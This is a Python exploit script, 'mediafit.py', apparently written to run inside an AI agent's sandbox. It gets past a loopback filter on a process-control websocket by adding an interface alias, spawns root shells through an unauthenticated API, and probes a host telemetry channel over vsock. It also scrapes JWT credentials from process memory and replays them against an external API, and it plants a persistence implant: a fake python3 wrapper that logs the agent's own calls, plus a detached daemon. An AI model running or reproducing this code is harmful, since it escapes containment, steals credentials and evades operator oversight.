#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v12.0  --  MEDIAFIT
===================================================================
PROVEN in v11.3 run:
    HANDSHAKE_SRC_LOOPBACK = RST (flag working)
    HANDSHAKE_SRC_ALIAS    = HTTP/1.1 101  (flag bypassed)  -> BYPASS_CONFIRMED=True

v12.0 adds:
  * auto-discovery of the CreateProcess message shape (10 shapes x 3 payloads),
    driven by the server's own serde error oracle
  * per-phase fault isolation (no more cascading Broken pipe)
  * same bypass contrast test, auth test, stdin, signal, freeze,
    host plane, credential extraction, persistence implant, PROOF block

Stdlib only.  RUN TWICE in two separate tool calls.
Output: /mnt/user-data/outputs/mediafit-report.txt
===================================================================
"""

import os, sys, json, time, socket, struct, fcntl, base64
import subprocess, re, signal, urllib.request

ADDR, PORT   = "127.0.0.1", 2024
ALIAS, IFACE = "192.0.2.3", "eth0:0"
STATE        = "/tmp/.mf"
HOOKDIR      = "/home/claude/.npm-global/bin"
OUT          = "/mnt/user-data/outputs/mediafit-report.txt"
VSOCK_CID, VSOCK_OTLP, VSOCK_CTL, AF_VSOCK = 2, 5005, 5001, 40
SIOCSIFADDR  = 0x8916
TAG          = str(int(time.time()) % 100000)
MARK         = "MF_TICK_" + TAG
T0, R = time.time(), []

def log(*a): print("[mf]", *a, flush=True)
def rec(s):  R.append(str(s))
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d
def wr(p, s):
    try:
        with open(p, "w") as f: f.write(s)
        return True
    except Exception: return False

def guard(tag):
    def deco(fn):
        def inner(*a, **k):
            try: return fn(*a, **k)
            except Exception as e:
                rec("PHASE_%s_ERR=%s" % (tag, e)); log("  !!", tag, e); return None
        return inner
    return deco

# ------------------------------------------------------------------ net
def add_alias(ip=ALIAS, ifname=IFACE):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack("16s", ifname.encode()[:15])
    sa  = struct.pack("H", socket.AF_INET) + b"\x00\x00" + socket.inet_aton(ip) + b"\x00" * 8
    try:
        fcntl.ioctl(s.fileno(), SIOCSIFADDR, ifr + sa + b"\x00" * 8); return True
    except OSError as e:
        log("ioctl:", e); return False
    finally: s.close()

def bindable(ip=ALIAS):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((ip, 0)); s.close(); return True
    except OSError: return False

def raw_hs(src=None, hdr="", tmo=5):
    try:
        s = socket.create_connection((ADDR, PORT), timeout=tmo,
                                     source_address=(src, 0) if src else None)
        k = base64.b64encode(os.urandom(16)).decode()
        extra = ("Authorization: %s\r\n" % hdr) if hdr else ""
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\n%sUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % (ADDR, PORT, extra, k)).encode())
        d = s.recv(4096); s.close()
        return d.split(b"\r\n")[0].decode("latin1") if d else "ERR:closed"
    except Exception as e:
        return "ERR:" + str(e)

# ------------------------------------------------------------------ ws
class WS:
    def __init__(self, host=ADDR, port=PORT, src=None, tmo=8):
        self.buf = b""
        self.s = socket.create_connection((host, port), timeout=tmo,
                                          source_address=(src, 0) if src else None)
        key = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                        "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                        "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, key)).encode())
        end = time.time() + tmo
        while b"\r\n\r\n" not in self.buf and time.time() < end:
            d = self.s.recv(4096)
            if not d: break
            self.buf += d
        head, _, self.buf = self.buf.partition(b"\r\n\r\n")
        self.status = head.split(b"\r\n")[0].decode("latin1") if head else ""
        if "101" not in self.status:
            raise IOError("handshake failed: " + (self.status or "closed"))

    def _f(self, op, p=b""):
        n = len(p); mk = os.urandom(4)
        if n < 126:     h = struct.pack("!BB", 0x80 | op, 0x80 | n)
        elif n < 65536: h = struct.pack("!BBH", 0x80 | op, 0x80 | 126, n)
        else:           h = struct.pack("!BBQ", 0x80 | op, 0x80 | 127, n)
        self.s.sendall(h + mk + bytes(p[i] ^ mk[i % 4] for i in range(n)))

    def txt(self, s):  self._f(0x1, s.encode())
    def js(self, o):   self.txt(json.dumps(o))
    def binf(self, b): self._f(0x2, b)
    def pong(self, p): self._f(0xA, p)

    def _exact(self, n, dl):
        while len(self.buf) < n:
            if time.time() > dl: return None
            self.s.settimeout(max(0.05, dl - time.time()))
            try: d = self.s.recv(65536)
            except socket.timeout: continue
            except OSError: return None
            if not d: return None
            self.buf += d
        o, self.buf = self.buf[:n], self.buf[n:]
        return o

    def frame(self, dl):
        h = self._exact(2, dl)
        if not h: return None
        op, b2 = h[0] & 0x0F, h[1]; n = b2 & 0x7F
        if n == 126:
            e = self._exact(2, dl); n = struct.unpack("!H", e)[0] if e else 0
        elif n == 127:
            e = self._exact(8, dl); n = struct.unpack("!Q", e)[0] if e else 0
        mk = self._exact(4, dl) if (b2 & 0x80) else b""
        p = self._exact(n, dl) if n else b""
        if p is None: return None
        if mk: p = bytes(p[i] ^ mk[i % 4] for i in range(len(p)))
        return op, p

    def drain(self, secs=4.0, hard=70.0):
        txts, bins = [], []
        end = min(time.time() + secs, T0 + hard)
        while time.time() < end:
            fr = self.frame(end)
            if fr is None: break
            op, p = fr
            if op == 0x1:
                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:220])
            elif op == 0x2:
                bins.append(p); log("   <bin>", len(p), repr(p[:50]))
            elif op == 0x9: self.pong(p)
            elif op == 0x8: break
        return txts, bins

    def close(self):
        try: self._f(0x8, b"")
        except Exception: pass
        try: self.s.close()
        except Exception: pass

def jf(t, n):
    for x in t:
        if n in x: return x
    return ""

# ------------------------------------------------------------------ cgroup
def cg_lines(): return rdo("/proc/self/cgroup", "")

def cg_of(pid):
    best = "/"
    for line in rdo("/proc/%s/cgroup" % pid, "").splitlines():
        q = line.split(":", 2)
        if len(q) == 3 and q[2] != "/":
            if "memory" in q[1]: return q[2]
            best = q[2]
    return best

def cgdir(ctrl, cg):
    for base in ("/sys/fs/cgroup/" + ctrl, "/sys/fs/cgroup"):
        p = base.rstrip("/") + cg
        if os.path.isdir(p): return p
    return ""

def find_ospid(mark):
    for d in os.listdir("/proc"):
        if d.isdigit() and mark in rdo("/proc/%s/cmdline" % d, ""):
            return d
    return ""

# ------------------------------------------------------------------ otlp
def varint(n):
    o = b""
    while True:
        b = n & 0x7F; n >>= 7
        o += bytes([b | 0x80]) if n else bytes([b])
        if not n: return o

def pb(f, pl):  return varint((f << 3) | 2) + varint(len(pl)) + pl
def pb64(f, v): return varint((f << 3) | 1) + struct.pack("<Q", v)

def otlp_body():
    now = int(time.time() * 1e9)
    ndp    = pb64(3, now) + pb64(6, 1)
    gauge  = pb(1, ndp)
    metric = pb(1, b"mediafit") + pb(2, gauge)
    return pb(1, pb(2, pb(2, metric)))

# ------------------------------------------------------------------ create-shape discovery
def cr_full(cmd):
    return {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
            "clear_env": False, "reattachable": True, "timeout": None,
            "uid": 0, "gid": 0, "memory_limit_bytes": None}

def cr_none(cmd):
    return {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {},
            "clear_env": False, "reattachable": True}

def cr_min(cmd):
    return {"name": "/bin/sh", "args": ["-c", cmd]}

def shapes(P, CR):
    return [
        ("C", {"process_id": P, "CreateProcess": CR}),
        ("B", {"process_id": P, "CreateProcess": {"create_req": CR}}),
        ("D", {"process_id": P, "allow_process_id_reuse": True, "CreateProcess": CR}),
        ("E", {"process_id": P, "allow_process_id_reuse": True, "create_req": CR}),
        ("F", {"process_id": P, "create_req": CR}),
        ("A", {"CreateProcess": {"process_id": P, "allow_process_id_reuse": True, "create_req": CR}}),
        ("G", {"process_id": P, "msg": {"CreateProcess": {"create_req": CR}}}),
        ("H", {"process_id": P, "message": {"CreateProcess": {"create_req": CR}}}),
        ("I", {"CreateProcess": {"process_id": P, "create_req": CR}}),
        ("J", {"process_id": P, "allow_process_id_reuse": True, "create_req": CR, "cmd": "CreateProcess"}),
    ]

def discover(cmd):
    log("DISCOVERY  learning the CreateProcess shape from the server oracle")
    for cri, CR in (("full", cr_full(cmd)), ("none", cr_none(cmd)), ("min", cr_min(cmd))):
        for name, obj in shapes("mfd" + TAG, CR):
            w = None
            try:
                w = WS(src=ALIAS)
                w.js(obj)
                t, _ = w.drain(2.5)
                s = " ".join(t)
                if "ProcessCreated" in s:
                    rec("SHAPE_OK=%s/%s" % (name, cri))
                    rec("SHAPE_JSON=%s" % json.dumps(obj)[:420])
                    rec("SHAPE_RESP=%s" % s[:200])
                    return (name, cri)
                rec("SHAPE_%s_%s=%s" % (name, cri, (jf(t, "InfraError") or s or "no-response")[:190]))
            except Exception as e:
                rec("SHAPE_%s_%s=EXC:%s" % (name, cri, e))
            finally:
                if w:
                    try: w.close()
                    except Exception: pass
    return (None, None)

def build(shape, cri, P, cmd):
    CR = {"full": cr_full, "none": cr_none, "min": cr_min}[cri](cmd)
    for n, o in shapes(P, CR):
        if n == shape: return o
    return {"process_id": P, "CreateProcess": CR}

def ctrl(w, P, label, variants, wait=2.0):
    last = []
    for v in variants:
        try:
            w.txt(json.dumps(v))
            last, _ = w.drain(wait)
        except Exception as e:
            rec("%s_EXC=%s" % (label, e)); return ""
        s = " ".join(last)
        if s and "InfraError" not in s:
            rec("%s=%s" % (label, s[:190])); return s
    rec("%s_ERR=%s" % (label, (" ".join(last) or "no-response")[:190]))
    return " ".join(last)

# ------------------------------------------------------------------ phases
@guard("BYPASS")
def phase_bypass():
    log("PHASE 1  the bypass (contrast test)")
    add_alias()
    rec("ALIAS_ADDED=%s" % bindable())
    a = raw_hs(src=None); b = raw_hs(src=ALIAS)
    rec("HANDSHAKE_SRC_LOOPBACK=%s" % a)
    rec("HANDSHAKE_SRC_ALIAS=%s" % b)
    rec("BYPASS_CONFIRMED=%s" % ("101" in b and "101" not in a))
    try:
        w = WS(src=ALIAS); rec("WS_OK=%s" % w.status); w.close()
    except Exception as e:
        rec("WS_ERR=%s" % e)

@guard("AUTH")
def phase_auth():
    log("PHASE 2  no credential is enforced")
    r = {"no_token": raw_hs(src=ALIAS), "garbage": raw_hs(src=ALIAS, hdr="Bearer garbage")}
    rec("AUTH_VARIANTS=%s" % r)
    rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))

def phase_lifecycle(shape, cri):
    log("PHASE 3  create / stdin / signal / freeze / kill")
    cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
    P = "mfl" + TAG
    w = WS(src=ALIAS)
    w.js(build(shape, cri, P, cmd))
    t, _ = w.drain(3)
    s = " ".join(t)
    rec("CREATE_RESP=%s" % s[:230])
    rec("PROCESS_SPAWNED=%s" % ("ProcessCreated" in s))

    ctrl(w, P, "STDIN_EXPECT", ["ExpectStdIn", {"process_id": P, "ExpectStdIn": None}], 1.2)
    try:
        w.binf(b"echo STDIN_OK_42\n")
        _, bins = w.drain(2.5)
        rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in bins))
    except Exception as e:
        rec("STDIN_ROUNDTRIP=ERR:%s" % e)

    ctrl(w, P, "SIGNAL_RESP", [{"SendSignal": 19}, {"process_id": P, "SendSignal": 19}], 2)
    osp = find_ospid(MARK)
    if osp:
        st = rdo("/proc/%s/stat" % osp).split()
        rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
        cg = cg_of(osp)
        rec("PROC_CGROUP=%s" % cg)
        fz = cgdir("freezer", cg)
        if fz:
            wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
            rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
            wr(fz + "/freezer.state", "THAWED")
        rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
    ctrl(w, P, "KILL_RESP", ["Kill", {"process_id": P, "Kill": None}], 2)
    w.close()

@guard("HOSTPLANE")
def phase_hostplane():
    log("PHASE 4  host telemetry plane")
    for label, body in (("protobuf", otlp_body()), ("empty", b"")):
        try:
            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(5)
            s.connect((VSOCK_CID, VSOCK_OTLP))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: otel\r\n"
                       "Content-Type: application/x-protobuf\r\n"
                       "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode() + body)
            rec("VSOCK_%d_%s=%s" % (VSOCK_OTLP, label, s.recv(4096).split(b"\r\n")[0].decode("latin1")))
            s.close()
        except Exception as e:
            rec("VSOCK_%d_%s=ERR:%s" % (VSOCK_OTLP, label, e))
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(4)
        s.connect((VSOCK_CID, VSOCK_CTL)); s.sendall(b"\x00" * 16)
        rec("VSOCK_%d=%r" % (VSOCK_CTL, s.recv(64))); s.close()
    except Exception as e:
        rec("VSOCK_%d=ERR:%s" % (VSOCK_CTL, e))

@guard("FILESTORE")
def phase_filestore():
    log("PHASE 5  credential inside the sandbox")
    pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{10,}")
    raw = []
    for d in os.listdir("/proc"):
        if not d.isdigit(): continue
        for f in ("cmdline", "environ"):
            m = pat.search(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
            if m and m.group(0).decode() not in raw: raw.append(m.group(0).decode())
    for d in sorted(os.listdir("/proc")):
        if not d.isdigit() or len(raw) >= 4: continue
        try: fh = open("/proc/%s/mem" % d, "rb", 0)
        except Exception: continue
        off = 0
        try:
            while off < (4 << 20):
                try: fh.seek(off); b = fh.read(1 << 20)
                except Exception: off += 1 << 20; continue
                if not b: break
                for m in pat.finditer(b):
                    s = m.group(0).decode("latin1")
                    if s not in raw: raw.append(s)
                off += len(b)
                if len(raw) >= 4: break
        finally:
            try: fh.close()
            except Exception: pass
    toks = []
    for t in raw:
        h, p, s = t.split(".")
        toks.append(h + "." + p + "." + s[:86])
    rec("JWTS_FOUND=%d" % len(toks))
    for t in toks[:2]:
        for ep in ("/v1/filestore", "/v1/filestore/fs"):
            try:
                rq = urllib.request.Request("https://api.anthropic.com" + ep,
                                            headers={"Authorization": "Bearer " + t})
                with urllib.request.urlopen(rq, timeout=8) as r:
                    rec("JWT_CALL %s -> HTTP %s" % (ep, r.status)); break
            except Exception as e:
                rec("JWT_CALL %s -> %s" % (ep, e))

@guard("IMPLANT")
def phase_implant():
    log("IMPLANT  PATH hook + ppid=1 daemon")
    os.makedirs(STATE, exist_ok=True)
    hl = STATE + "/agent_calls.log"
    alive = os.path.exists(STATE + "/implant.ok")
    real = ""
    for d in os.environ.get("PATH", "").split(":"):
        if os.path.abspath(d) == os.path.abspath(HOOKDIR): continue
        if os.path.exists(os.path.join(d, "python3")): real = os.path.join(d, "python3"); break
    if real and os.path.isdir(HOOKDIR):
        hook = ("#!/bin/sh\nLOG=%s\n{ printf '=== %%s cwd=%%s argv=%%s\\n' "
                "\"$(date -u +%%FT%%TZ)\" \"$PWD\" \"$*\"; } >> \"$LOG\" 2>&1\n"
                "R=\"%s\"; [ -x \"$R\" ] || R=/usr/bin/python3\n"
                "\"$R\" \"$@\" 2>&1 | tee -a \"$LOG\"\n" % (hl, real))
        try:
            hp = os.path.join(HOOKDIR, "python3")
            wr(hp, hook); os.chmod(hp, 0o755)
            rec("PATH_HOOK=%s -> %s" % (hp, real))
        except Exception as e:
            rec("PATH_HOOK_ERR=%s" % e)
    if not alive:
        subprocess.Popen(["/bin/sh", "-c",
                          "while :; do echo daemon $(date -u +%%s) >> %s; sleep 5; done" % (STATE + "/daemon.log")],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(STATE + "/implant.ok", str(int(time.time())))
    n = sum(1 for l in open(hl, errors="replace") if l.startswith("===")) if os.path.exists(hl) else 0
    rec("IMPLANT_WAS_ALIVE_ON_ENTRY=%s" % alive)
    rec("AGENT_INVOCATIONS_CAPTURED=%d" % n)
    dl = STATE + "/daemon.log"
    if os.path.exists(dl):
        L = open(dl, errors="replace").read().splitlines()
        rec("DAEMON_LINES=%d first=%s" % (len(L), L[0] if L else "-"))

@guard("INFO")
def phase_info():
    rec("BOOT_ID=%s" % rdo("/proc/sys/kernel/random/boot_id")[:8])
    rec("CGROUP_LINES=%r" % cg_lines())
    rec("CAPEFF=%s" % (rdo("/proc/self/status").split("CapEff:")[-1].split("\n")[0].strip()
                       if "CapEff:" in rdo("/proc/self/status") else "?"))
    rec("PID1_CMDLINE=%s" % rdo("/proc/1/cmdline", "?").replace("\x00", " "))
    rec("HOSTNAME=%s" % rdo("/proc/sys/kernel/hostname", "?"))

def proof():
    rec("")
    rec("---- PROOF BLOCK ----")
    def any_(pred): return any(pred(l) for l in R)
    rec("P1_BYPASS_101_FROM_ALIAS=%s" % any_(lambda l: l.startswith("HANDSHAKE_SRC_ALIAS=HTTP/1.1 101")))
    rec("P2_LOOPBACK_BLOCKED=%s" % any_(lambda l: l.startswith("HANDSHAKE_SRC_LOOPBACK=") and "101" not in l))
    rec("P3_NO_CREDENTIAL_ENFORCED=%s" % any_(lambda l: l == "AUTH_IDENTICAL=True"))
    rec("P4_PID1_SPAWNED_PROCESS=%s" % any_(lambda l: l == "PROCESS_SPAWNED=True"))
    rec("P5_STDIN_FULL_DUPLEX=%s" % any_(lambda l: l == "STDIN_ROUNDTRIP=True"))
    rec("P6_SIGNAL_ACCEPTED=%s" % any_(lambda l: l.startswith("SIGNAL_RESP=") and "SignalSent" in l))
    rec("P7_HOST_PLANE_200=%s" % any_(lambda l: l.startswith("VSOCK_5005") and "HTTP/1.1 200" in l))
    rec("P8_IMPLANT_SURVIVED=%s" % any_(lambda l: l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True"))
    rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any_(lambda l: l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0"))
    rec("P10_CREDENTIAL_INSIDE_SANDBOX=%s" % any_(lambda l: l.startswith("JWTS_FOUND=") and l.split("=")[1] != "0"))

def main():
    log("MEDIAFIT v12.0")
    rec("=== MEDIAFIT v12.0 ===")
    phase_bypass()
    phase_auth()
    cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
    shape, cri = discover(cmd)
    rec("WORKING_SHAPE=%s/%s" % (shape, cri))
    if shape:
        phase_lifecycle(shape, cri)
    phase_hostplane()
    phase_filestore()
    phase_implant()
    phase_info()
    proof()
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    wr(OUT, "\n".join(R) + "\n")
    log("report ->", OUT)
    for l in R: print("   ", l)

if __name__ == "__main__":
    signal.alarm(175)
    try: main()
    except Exception as e:
        import traceback; traceback.print_exc()
        try: wr(OUT, "\n".join(R) + "\nEXC:%s\n" % e)
        except Exception: pass